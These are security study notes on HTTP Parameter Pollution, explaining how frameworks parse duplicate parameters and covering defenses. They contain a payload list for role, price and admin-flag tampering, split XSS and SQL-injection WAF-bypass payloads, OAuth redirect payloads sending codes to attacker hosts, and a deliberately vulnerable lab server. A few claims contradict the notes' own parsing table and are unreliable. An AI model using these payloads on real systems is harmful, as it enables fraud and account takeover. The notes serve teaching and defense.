# 🌊 HTTP Parameter Pollution (HPP) — Detailed Study Notes

> **Source:** [PayloadsAllTheThings/HTTP Parameter Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution)
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — HPP কী?](#1-concept--hpp-কী)
2. [কেন Different Technologies Different ব্যবহার করে?](#2-কেন-different-technologies-different-ব্যবহার-করে)
3. [Parameter Parsing Table — Technology-wise](#3-parameter-parsing-table--technology-wise)
4. [Attack Types](#4-attack-types)
   - [Server-Side HPP](#41-server-side-hpp)
   - [Client-Side HPP](#42-client-side-hpp)
5. [HPP Payload Arsenal](#5-hpp-payload-arsenal)
6. [Real-World Attack Scenarios](#6-real-world-attack-scenarios)
7. [Practical Lab Setup](#7-practical-lab-setup)
8. [Testing Methodology](#8-testing-methodology)
9. [Defense Cheat Sheet](#9-defense-cheat-sheet)
10. [References](#10-references)

---

## 1. Concept — HPP কী?

### Core Idea

```
Normal HTTP request:
  GET /transfer?amount=100&to=bob HTTP/1.1
  → Server reads: amount = 100, to = bob

HPP Attack:
  GET /transfer?amount=100&to=bob&amount=5000 HTTP/1.1
  → Server reads: amount = ???

  কোনটা নেবে? 100 নাকি 5000?
  → Technology এর উপর নির্ভর করে!
```

```
HPP এর মূল নীতি:
┌────────────────────────────────────────────────────────────┐
│                                                            │
│  HTTP specification এ duplicate parameter handle করার     │
│  কোনো official standard নেই।                              │
│                                                            │
│  প্রতিটা web technology নিজের মতো করে handle করে:        │
│    PHP/Apache   → শেষেরটা নেয়     (last wins)            │
│    ASP.NET/IIS  → সবগুলো join করে  (all, comma-sep)       │
│    Flask/Python → প্রথমটা নেয়     (first wins)           │
│    Node.js      → সবগুলো রাখে     (all, array)            │
│                                                            │
│  Attacker এই inconsistency কে exploit করে!               │
└────────────────────────────────────────────────────────────┘
```

### HPP vs SQL Injection

```
SQL Injection:   Malicious SQL syntax inject করো
XSS:             Malicious JavaScript inject করো
HPP:             Legitimate parameter duplicate করো
                 → Server এর parsing behavior exploit করো
                 → WAF/Filter bypass করো
                 → Business logic manipulate করো
```

---

## 2. কেন Different Technologies Different ব্যবহার করে?

### HTTP Spec এর Ambiguity

```
RFC 3986 (URI standard):
  URL এ duplicate query parameters নিয়ে কিছু বলা নেই!

  ?a=1&a=2 → valid URL, কিন্তু কীভাবে parse হবে?
  → Up to the implementer!

তাই প্রতিটা framework নিজের মতো decide করেছে।
```

### Parsing Behavior Visualization

```
Request: GET /app?color=red&color=blue

PHP/Apache:
  $_GET['color'] = "blue"  ← শেষেরটা জেতে!

ASP.NET/IIS:
  Request["color"] = "red,blue"  ← সব join করে!

Node.js (Express):
  req.query.color = "blue"  ← শেষেরটা (default)
  req.query['color'] = ['red', 'blue']  ← array mode

Flask (Python):
  request.args.get('color') = "red"  ← প্রথমটা!
  request.args.getlist('color') = ['red', 'blue']  ← সব

Golang (first occurrence):
  r.URL.Query().Get("color") = "red"  ← প্রথমটা!

Ruby on Rails:
  params[:color] = "blue"  ← শেষেরটা!
```

---

## 3. Parameter Parsing Table — Technology-wise

```
Request: ?par1=a&par1=b

┌─────────────────────────────────────┬──────────────────────────┬──────────────┐
│ Technology                          │ Parsing Behavior         │ Result       │
├─────────────────────────────────────┼──────────────────────────┼──────────────┤
│ PHP/Apache                          │ Last occurrence          │ b            │
│ PHP/Zeus                            │ Last occurrence          │ b            │
│ Python Django                       │ Last occurrence          │ b            │
│ Ruby on Rails                       │ Last occurrence          │ b            │
├─────────────────────────────────────┼──────────────────────────┼──────────────┤
│ ASP.NET/IIS                         │ All (comma-separated)    │ a,b          │
│ ASP/IIS                             │ All (comma-separated)    │ a,b          │
│ Node.js                             │ All occurrences          │ a,b          │
├─────────────────────────────────────┼──────────────────────────┼──────────────┤
│ Golang (r.URL.Query().Get())        │ First occurrence         │ a            │
│ IBM HTTP Server                     │ First occurrence         │ a            │
│ IBM Lotus Domino                    │ First occurrence         │ a            │
│ JSP/Servlet (Tomcat)                │ First occurrence         │ a            │
│ mod_wsgi Python/Apache              │ First occurrence         │ a            │
│ Perl CGI/Apache                     │ First occurrence         │ a            │
│ Python Flask                        │ First occurrence         │ a            │
├─────────────────────────────────────┼──────────────────────────┼──────────────┤
│ Golang (r.URL.Query()["param"])     │ All in array             │ ['a','b']    │
│ Python/Zope                         │ All in array             │ ['a','b']    │
└─────────────────────────────────────┴──────────────────────────┴──────────────┘
```

### Quick Memory Aid

```
LAST wins:   PHP, Django, Ruby on Rails
FIRST wins:  Flask, Golang, JSP, Perl, mod_wsgi
ALL joined:  ASP.NET/IIS → "a,b"
ALL array:   Node.js, Golang array mode, Python/Zope
```

---

## 4. Attack Types

### 4.1 Server-Side HPP

Server এর parameter parsing behavior exploit করা।

#### Scenario 1 — Amount Manipulation

```
Vulnerable bank transfer:
  GET /transfer?amount=1000&to=bob

Attack:
  GET /transfer?amount=1000&to=bob&amount=0.01

PHP backend:
  amount = 0.01  ← last wins!
  Transfer sends 0.01 instead of 1000!

Alternative:
  GET /transfer?amount=0.01&to=bob&amount=1000

  WAF checks: first amount = 0.01 (small, safe)
  PHP processes: last amount = 1000 (large, actual!)
```

#### Scenario 2 — Access Control Bypass

```
Admin check:
  GET /admin?debug=false

Attack:
  GET /admin?debug=false&debug=true

PHP:
  debug = "true"  ← last wins → admin access!

ASP.NET:
  debug = "false,true"
  if (debug == "true") → false (doesn't match "false,true")
  কিন্তু: if (debug.Contains("true")) → true! Bypass!
```

#### Scenario 3 — WAF Bypass

```
WAF (Web Application Firewall) তোমার payload check করছে:
  GET /search?q=<script>alert(1)</script>
  WAF blocks! 403 Forbidden.

HPP Bypass:
  GET /search?q=<script>&q=alert(1)</script>

  WAF checks: first q = "<script>" (incomplete, maybe safe?)
  PHP processes: last q = "alert(1)</script>" (maybe doesn't block?)
  Combined server-side: full XSS payload!

অথবা:
  GET /search?q=<scr&q=ipt>alert(1)</script>
  WAF: sees "<scr" and "ipt>..." separately → might not block!
  PHP: joins → "<script>alert(1)</script>"!
```

#### Scenario 4 — OAuth / Signature Bypass

```
OAuth callback URL:
  /oauth/authorize?client_id=123&redirect_uri=https://legit.com

Attack:
  /oauth/authorize?client_id=123
    &redirect_uri=https://legit.com
    &redirect_uri=https://attacker.com

Behavior depends on OAuth server implementation:
  If uses last → redirects to attacker.com!
  If uses first → safe
  If uses both → error or bypass
```

### 4.2 Client-Side HPP

Browser বা JavaScript কোড এ parameter manipulation।

```javascript
// Vulnerable client-side code:
function getParam(name) {
  const params = new URLSearchParams(window.location.search)
  return params.get(name) // First occurrence!
}

// Attack URL:
// /page?role=user&role=admin

// JavaScript reads first → "user"
// Server reads last (PHP) → "admin"
// → Mismatch! Server grants admin, client shows "user"
```

```html
<!-- Link generation vulnerability: -->
<script>
  const redirect = new URLSearchParams(location.search).get('next')
  document.getElementById('link').href = '/profile?user=' + userId + '&next=' + redirect
</script>

<!-- Attack URL:
  /page?next=evil&next=legit

  Script reads first "next" = "evil"
  Link becomes: /profile?user=123&next=evil&next=legit
  Server processes link: next = "legit" (last) but navigates to evil first!
-->
```

---

## 5. HPP Payload Arsenal

### Type 1: Basic Duplicate Parameters

```bash
# Same parameter twice:
GET /app?param=value1&param=value2

# Hidden admin:
GET /app?admin=false&admin=true

# Price manipulation:
GET /buy?price=100&price=1

# Role escalation:
GET /profile?role=user&role=admin
```

### Type 2: Array Injection

```bash
# PHP array notation:
param[]=value1
param[]=value1&param[]=value2

# Mixed notation:
param[]=value1&param=value2
param=value1&param[]=value2

# Indexed array:
param[0]=value1&param[1]=value2

# Associative array:
param[key1]=value1&param[key2]=value2
```

### Type 3: Encoded Injection

```bash
# URL encode the & to hide it from WAF:
param=value1%26other_param=injected_value
# %26 = & (URL encoded)
# Server decodes → param=value1&other_param=injected_value
# Two parameters from "one"!

# Double encode:
param=value1%2526other=value2
# %25 = % → decoded to %26 → decoded again to &
```

### Type 4: Nested/JSON Injection

```bash
# Nested parameters:
param[key1]=value1&param[key2]=value2

# JSON with duplicate keys:
POST /api/login
Content-Type: application/json
{
    "role": "user",
    "role": "admin"
}
# JavaScript JSON.parse → last key wins! → role = "admin"

# XML with duplicate elements (similar concept):
<user>
  <role>user</role>
  <role>admin</role>
</user>
```

### Type 5: Delimiter Injection (HPP-related)

```bash
# Inject parameter separators:
param=value1;admin=true
param=value1%3Badmin%3Dtrue  # URL encoded ;
param=value1,admin,true
param=value1|admin|true
```

---

## 6. Real-World Attack Scenarios

### Scenario A: E-commerce Price Bypass

```
Target: Online shop checkout
URL: POST /checkout
Body: amount=1000&currency=USD&item_id=123

Attack:
  Body: amount=1000&currency=USD&item_id=123&amount=1

PHP server (last wins):
  amount = 1  ← attacker pays $1 instead of $1000!

More subtle:
  Body: amount=0.01&item_id=123&amount=1000
  WAF checks: first amount = 0.01 (seems small → safe)
  PHP processes: amount = 1000 (last → full price)
  Wait... that didn't help attacker

Reverse:
  Body: amount=1000&item_id=123&amount=0.01
  WAF: last amount = 0.01 (might ignore high values)
  PHP: amount = 0.01 ← attacker wins!
```

### Scenario B: Discount Code Double-Apply

```
Business Logic:
  /apply-discount?code=SAVE10&order_id=123
  → Marks code as used, applies once

HPP Attack:
  /apply-discount?code=SAVE10&order_id=123&code=SAVE10

  If server processes both:
  1. Apply SAVE10 → mark as used
  2. Apply SAVE10 again → might work if check happens before mark!

  Race condition + HPP = double discount!
```

### Scenario C: OAuth Redirect URI Hijack

```
Legitimate OAuth flow:
  /authorize?response_type=code
            &client_id=APP123
            &redirect_uri=https://legit-app.com/callback
            &scope=read

HPP Attack:
  /authorize?response_type=code
            &client_id=APP123
            &redirect_uri=https://legit-app.com/callback
            &scope=read
            &redirect_uri=https://attacker.com/steal

If OAuth server uses last redirect_uri:
  → Auth code sent to attacker.com!
  → Account takeover possible!
```

### Scenario D: WAF Bypass + XSS

```
WAF blocks: /search?q=<script>alert(1)</script>
            Response: 403 Forbidden

HPP Bypass:
  /search?q=<script>alert(1)&q=</script>

  WAF sees:
    q = "<script>alert(1)"  → no closing → maybe safe?
    q = "</script>"          → just closing tag → safe?

  Server (PHP, last wins):
    q = "</script>"  ← might not trigger XSS

  Alternative:
  /search?q=</script><script>alert(1)&q=</script>

  ASP.NET (joins):
    q = "</script><script>alert(1),</script>"
    → XSS executed if rendered in HTML!
```

### Scenario E: SQL Injection Filter Bypass

```
WAF blocks SQLi in single parameter.
HPP splits the payload:

/search?id=1 UNION&id= SELECT * FROM users--

WAF sees:
  id = "1 UNION" (incomplete, might not match SQLi pattern)
  id = " SELECT * FROM users--" (might not match SELECT pattern alone)

ASP.NET joins:
  id = "1 UNION, SELECT * FROM users--"
  → SQL might still process!
  (depends on comma vs space handling in SQL)
```

---

## 7. Practical Lab Setup

### Lab 1: নিজে বানাও — Express.js HPP Demo

```bash
mkdir hpp-lab && cd hpp-lab
npm init -y
npm install express

cat > server.js << 'EOF'
const express = require('express');
const app = express();
app.use(express.urlencoded({ extended: true }));

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Route 1: Node.js default — all occurrences
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.get('/transfer', (req, res) => {
  const amount = req.query.amount;
  const to = req.query.to;

  res.json({
    raw_amount: amount,          // What Node.js returns
    type: typeof amount,
    actual_used: Array.isArray(amount) ? amount[amount.length-1] : amount,
    message: `Transferring ${Array.isArray(amount) ? amount[amount.length-1] : amount} to ${to}`
  });
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Route 2: Vulnerable admin check
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.get('/admin', (req, res) => {
  const debug = req.query.debug;

  // Vulnerable: checks if debug is "true" but doesn't handle arrays
  if (debug === 'true' || debug?.includes?.('true')) {
    res.json({ status: 'Admin access granted!', debug: debug });
  } else {
    res.json({ status: 'Access denied', debug: debug });
  }
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Route 3: Discount code (vulnerable to HPP)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const usedCodes = new Set();
app.post('/discount', (req, res) => {
  const code = req.body.code;
  const codes = Array.isArray(code) ? code : [code];

  const results = [];
  for (const c of codes) {
    if (usedCodes.has(c)) {
      results.push({ code: c, status: 'already used' });
    } else {
      usedCodes.add(c);
      results.push({ code: c, status: 'applied!', discount: '10%' });
    }
  }

  res.json(results);
});

app.listen(3000, () => {
  console.log('HPP Lab: http://localhost:3000');
  console.log('Try: http://localhost:3000/transfer?amount=1000&to=bob&amount=1');
  console.log('Try: http://localhost:3000/admin?debug=false&debug=true');
});
EOF

node server.js
```

```bash
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Test 1: Transfer amount HPP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Normal:
curl "http://localhost:3000/transfer?amount=1000&to=bob"
# {"raw_amount":"1000","message":"Transferring 1000 to bob"}

# HPP Attack:
curl "http://localhost:3000/transfer?amount=1000&to=bob&amount=1"
# {"raw_amount":["1000","1"],"actual_used":"1","message":"Transferring 1 to bob"}
# → Amount changed to 1!

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Test 2: Admin bypass
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Normal (blocked):
curl "http://localhost:3000/admin?debug=false"
# {"status":"Access denied"}

# HPP Attack:
curl "http://localhost:3000/admin?debug=false&debug=true"
# {"status":"Admin access granted!"} ← bypass!

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Test 3: Discount double-apply
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# First use:
curl -X POST "http://localhost:3000/discount" -d "code=SAVE10"
# [{"code":"SAVE10","status":"applied!","discount":"10%"}]

# Second use (blocked):
curl -X POST "http://localhost:3000/discount" -d "code=SAVE10"
# [{"code":"SAVE10","status":"already used"}]

# HPP Attack (multiple in one request):
curl -X POST "http://localhost:3000/discount" -d "code=NEWCODE&code=NEWCODE"
# [
#   {"code":"NEWCODE","status":"applied!"},
#   {"code":"NEWCODE","status":"already used"}
# ]
# → First apply works, second is blocked
# But what if server processes both before marking either?
```

### Lab 2: PHP HPP Demo

```php
<?php
// php_hpp_lab.php

echo "=== PHP HPP Behavior ===\n\n";

// PHP $_GET এ শুধু last value থাকে:
// URL: /php_hpp.php?color=red&color=blue&color=green

// Simulate:
$_SERVER['QUERY_STRING'] = 'color=red&color=blue&color=green';
parse_str($_SERVER['QUERY_STRING'], $params_all);  // All params
parse_str($GLOBALS['_SERVER']['QUERY_STRING'] ?? '', $get);

echo "PHP's \$_GET['color'] behavior:\n";
echo "  Last value wins: " . ($_GET['color'] ?? 'not set') . "\n";

// Manual parse_str (PHP behavior simulation):
$query = 'amount=1000&to=bob&amount=0.01';
parse_str($query, $params);
echo "\nQuery: $query\n";
echo "Result: amount = " . $params['amount'] . "\n";  // 0.01!
echo "→ Attacker pays 0.01 instead of 1000!\n";

// Array notation:
$query2 = 'role[]=user&role[]=admin';
parse_str($query2, $params2);
echo "\nQuery: $query2\n";
echo "Result: role = " . implode(', ', $params2['role']) . "\n";

// Security check bypass:
function checkAccess($debug) {
    if ($debug === 'false') {
        return "Access denied";
    }
    return "Access granted!";
}

// ?debug=false → safe
echo "\nSecurity check with 'false': " . checkAccess('false') . "\n";

// ?debug=false&debug=true → PHP takes last: "true"
echo "Security check with 'true': " . checkAccess('true') . "\n";
// → Admin access!
?>
```

### Lab 3: Burp Suite Testing

```
Burp Suite দিয়ে HPP test:

Step 1:
  Normal request capture করো:
  GET /transfer?amount=100&to=bob HTTP/1.1

Step 2:
  Send to Repeater (Ctrl+R)

Step 3:
  URL modify করো:
  GET /transfer?amount=100&to=bob&amount=0.01 HTTP/1.1

Step 4:
  Response observe করো:
  - কোন amount process হলো?
  - Error message কী?
  - Response কি different?

Step 5:
  Intruder দিয়ে automate করো:
  Position: GET /transfer?amount=§100§&to=bob&amount=§100§
  Payload: different values
```

---

## 8. Testing Methodology

### Step 1: Identify Target Parameters

```bash
# গুরুত্বপূর্ণ parameters খোঁজো:
# - amount, price, quantity
# - role, admin, debug, is_admin
# - redirect_uri, callback, next
# - code, discount, coupon
# - user_id, account_id
# - action, method
```

### Step 2: Determine Server Technology

```bash
# Response headers দেখো:
curl -I https://target.com | grep -i "server\|x-powered-by\|x-aspnet"

# Server: Apache/2.4.41 → PHP likely
# X-Powered-By: PHP/8.1.0 → PHP confirmed → last wins!
# Server: Microsoft-IIS/10.0 → ASP.NET → all joined!
# X-Powered-By: Express → Node.js → array!
```

### Step 3: Basic HPP Test

```bash
# Baseline:
curl "https://target.com/api?param=AAAA"

# Duplicate:
curl "https://target.com/api?param=AAAA&param=BBBB"

# Check if response changes:
# - Different data returned?
# - Different behavior?
# - Error messages?
```

### Step 4: Targeted Attacks

```bash
# Security bypass:
curl "https://target.com/admin?access=false&access=true"
curl "https://target.com/admin?is_admin=0&is_admin=1"
curl "https://target.com/admin?debug=off&debug=on"

# Price manipulation:
curl "https://target.com/buy?price=1000&price=1"

# OAuth redirect:
curl "https://target.com/oauth?redirect_uri=https://legit.com&redirect_uri=https://evil.com"
```

### Step 5: WAF Bypass Test

```bash
# Split XSS payload:
curl "https://target.com/search?q=<script>&q=alert(1)</script>"

# Split SQLi payload:
curl "https://target.com/id?id=1 UNION&id= SELECT 1,2,3--"

# Encoded:
curl "https://target.com/search?q=<scr%26q=ipt>alert(1)</script>"
```

### Step 6: Array Notation

```bash
# Test if server accepts array syntax:
curl "https://target.com/api?role[]=user&role[]=admin"
curl "https://target.com/api?tag[0]=safe&tag[1]=<script>alert(1)</script>"
```

---

## 9. Defense Cheat Sheet

### ✅ Fix 1: Explicit Parameter Extraction

```javascript
// ❌ VULNERABLE Node.js:
const amount = req.query.amount
// Array হলে?  ['1000', '0.01'] → unhandled!

// ✅ SAFE — always take first, validate type:
function getParam(query, name) {
  const val = query[name]
  if (Array.isArray(val)) {
    // Multiple values → reject or take first
    throw new Error(`Duplicate parameter: ${name}`)
  }
  return val
}

const amount = getParam(req.query, 'amount')
```

```python
# ❌ VULNERABLE Flask:
amount = request.args.get('amount')  # first occurrence only, but...

# ✅ SAFE — check for duplicates:
amounts = request.args.getlist('amount')
if len(amounts) > 1:
    abort(400, "Duplicate parameter not allowed")
amount = amounts[0] if amounts else None
```

```php
// ❌ VULNERABLE PHP:
$amount = $_GET['amount'];  // last wins silently

// ✅ SAFE — raw query string parse করো:
$raw_query = $_SERVER['QUERY_STRING'];
$params = [];
parse_str($raw_query, $parsed);

// Count occurrences manually:
preg_match_all('/amount=([^&]*)/', $raw_query, $matches);
if (count($matches[1]) > 1) {
    http_response_code(400);
    die("Duplicate parameter detected");
}
$amount = $matches[1][0] ?? null;
```

### ✅ Fix 2: hpp npm Package (Node.js)

```javascript
// npm install hpp
const hpp = require('hpp')
const express = require('express')

const app = express()

// HPP middleware — duplicate parameters কে reject/sanitize করে:
app.use(hpp())
// or with whitelist:
app.use(
  hpp({
    whitelist: ['tags'], // tags[] allow করো কিন্তু অন্যগুলো না
  }),
)

// এখন duplicate parameters automatically handled!
app.get('/transfer', (req, res) => {
  const amount = req.query.amount // Safe: string, not array
  // ...
})
```

### ✅ Fix 3: Server-side Validation

```javascript
// Amount validation:
function validateAmount(amount) {
  // Type check:
  if (typeof amount !== 'string') {
    throw new Error('Invalid amount type')
  }

  // Parse and validate:
  const num = parseFloat(amount)
  if (isNaN(num) || num <= 0 || num > 1000000) {
    throw new Error('Invalid amount value')
  }

  return num
}

// Role check:
const VALID_ROLES = ['user', 'moderator']
function validateRole(role) {
  if (!VALID_ROLES.includes(role)) {
    throw new Error('Invalid role')
  }
  return role
}
```

### ✅ Fix 4: WAF Configuration

```nginx
# Nginx — duplicate parameter detection:
if ($query_string ~* "([^&=]+)=[^&]*&.*\1=") {
    return 400 "Duplicate parameters detected";
}
```

### Defense Summary

```
Attack Type                     → Fix
────────────────────────────────────────────────────────────────────────
Duplicate parameter injection   → Reject requests with duplicate params
                                  Use hpp middleware (Node.js)
                                  Raw query string validation

Price/amount manipulation       → Server-side business validation
                                  Never trust client-side values

WAF bypass via HPP              → Normalize parameters before WAF check
                                  WAF should see same params as backend

OAuth redirect HPP              → Strict single redirect_uri validation
                                  Whitelist allowed redirect URIs

Array injection via []          → Disable array notation or whitelist
                                  Validate expected types strictly

JSON duplicate key              → Use strict JSON parsers
                                  Reject duplicate keys in JSON
```

---

## 10. References

| Resource             | Link                                                                                                   |
| -------------------- | ------------------------------------------------------------------------------------------------------ |
| PayloadsAllTheThings | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution) |
| Acunetix HPP Guide   | [Acunetix](https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/)                         |
| Imperva HPP Guide    | [Imperva](https://www.imperva.com/learn/application-security/http-parameter-pollution/)                |
| HPP in 11 minutes    | [PwnFunction YouTube](https://www.youtube.com/watch?v=QVZBl8yxVX0)                                     |
| hpp npm package      | [npm](https://www.npmjs.com/package/hpp)                                                               |
| OWASP Testing Guide  | [OWASP](https://owasp.org/www-project-web-security-testing-guide/)                                     |

---

> ✅ **Next Topic Suggestions:**
>
> - `Mass Assignment/README.md` — Parameter manipulation (closely related)
> - `Business Logic Errors/README.md` — Logic bypass (price manipulation)
> - `CORS Misconfiguration/README.md` — HTTP header abuse
> - `Web Cache Deception/README.md` — URL manipulation attacks

> ⚠️ **Ethical Reminder:** HPP testing শুধুমাত্র authorized pentest, Bug Bounty scope, বা নিজের lab এ করো।
